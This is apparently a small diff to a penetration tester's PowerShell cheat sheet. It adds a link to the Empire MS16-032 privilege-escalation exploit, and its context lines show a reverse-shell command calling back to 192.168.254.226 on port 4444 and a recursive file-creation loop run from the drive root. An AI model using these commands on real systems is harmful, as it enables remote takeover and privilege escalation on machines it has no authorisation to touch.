@@ -36,6 +36,13 @@ cd / ;Get-ChildItem -Recurse -Directory | ForEach-Object {New-Item -ItemType fil
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
 
 
+- ---] Exploits
+====================
+
+# MS16-032 Powershell Empire - Allows for command option (for non-interactive / terminal based exploits)
+https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1
+
+
 
 - ---] Notes
 ====================
